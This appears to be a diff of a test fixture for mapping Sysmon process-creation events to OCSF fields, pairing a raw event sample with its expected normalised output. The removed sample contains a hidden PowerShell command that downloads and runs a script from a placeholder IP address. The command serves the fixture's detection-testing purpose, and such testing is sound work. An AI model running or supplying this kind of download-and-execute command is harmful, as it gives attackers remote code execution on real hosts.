@@ -1,6 +1,39 @@
 ---
-raw_sample: '{"EventID":1,"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"ctdl-wks-07","message":"Process Create","event_data":{"RuleName":"technique_id=T1059,technique_name=Command-Line Interface","UtcTime":"2026-10-15T09:39:46.558Z","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(\"http://203.0.113.50/a\")","CurrentDirectory":"C:\\Windows\\system32\\\\","User":"CITADEL\\BSMITH","LogonId":"0x9da263","IntegrityLevel":"System","Hashes":"SHA256=103B1945E31833692B9B7710CDE08277183E99827C712FC60025E8D71359B594,MD5=0C8DFB28A33BB84CE50732A42BE8661D","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessId":"5000","ParentProcessId":"1000","ProcessGuid":"{1f47f4c6-c33d-74f5-793a-71dcfa7a63e6}","ParentProcessGuid":"{6e2c2d91-f949-24e8-456f-34bcb91d8bb4}","OriginalFileName":"powershell.exe"},"TimeCreated":"2026-10-15T09:39:52Z"}'
+# ProcessCreate with named event data: hashes, parent, session and a rule name that carries a sub-technique.
+raw_sample: '{"Computer":"WEB1.example.test","EventRecordID":5001,"EventID":1,"event_data":{"RuleName":"technique_id=T1059.001,technique_name=PowerShell","UtcTime":"2026-10-15 09:39:52.123","ProcessGuid":"{00000000-0000-0000-0000-000000000001}","ProcessId":"4242","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -c Get-Date","CurrentDirectory":"C:\\Users\\alice\\","User":"EXAMPLE\\Alice","LogonId":"0x5a234a5","IntegrityLevel":"High","Hashes":"SHA256=0000000000000000000000000000000000000000000000000000000000000004,MD5=00000000000000000000000000000005,IMPHASH=00000000000000000000000000000006,SHA1=0000000000000000000000000000000000000007","ParentProcessGuid":"{00000000-0000-0000-0000-000000000002}","ParentProcessId":"1000","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"C:\\Windows\\explorer.exe"}}'
 expected:
-  activity_id: 1
-  category_uid: 1
   class_uid: 1007
+  category_uid: 1
+  type_uid: 100701
+  activity_id: 1
+  severity_id: 1
+  status_id: 1
+  time: 1792057192123
+  process.name: powershell.exe
+  process.pid: 4242
+  process.uid: '{00000000-0000-0000-0000-000000000001}'
+  process.cmd_line: powershell.exe -nop -w hidden -c Get-Date
+  process.working_directory: 'C:\Users\alice\'
+  process.created_time: 1792057192123
+  process.session.uid: '0x5a234a5'
+  process.integrity_id: 4
+  process.integrity: High
+  process.user.name: alice
+  process.user.domain: example
+  process.file.hashes:
+    - {algorithm_id: 3, algorithm: SHA-256, value: "0000000000000000000000000000000000000000000000000000000000000004"}
+    - {algorithm_id: 1, algorithm: MD5, value: "00000000000000000000000000000005"}
+    - {algorithm_id: 18, algorithm: Imphash, value: "00000000000000000000000000000006"}
+    - {algorithm_id: 2, algorithm: SHA-1, value: "0000000000000000000000000000000000000007"}
+  process.parent_process.name: explorer.exe
+  process.parent_process.pid: 1000
+  process.parent_process.cmd_line: 'C:\Windows\explorer.exe'
+  actor.process.uid: '{00000000-0000-0000-0000-000000000002}'
+  actor.user.name: alice
+  device.hostname: web1.example.test
+  attacks:
+    - technique: {uid: T1059}
+      sub_technique: {uid: T1059.001, name: PowerShell}
+  metadata.uid: '5001'
+  metadata.original_time: '2026-10-15 09:39:52.123'
+  metadata.profiles: [security_control]
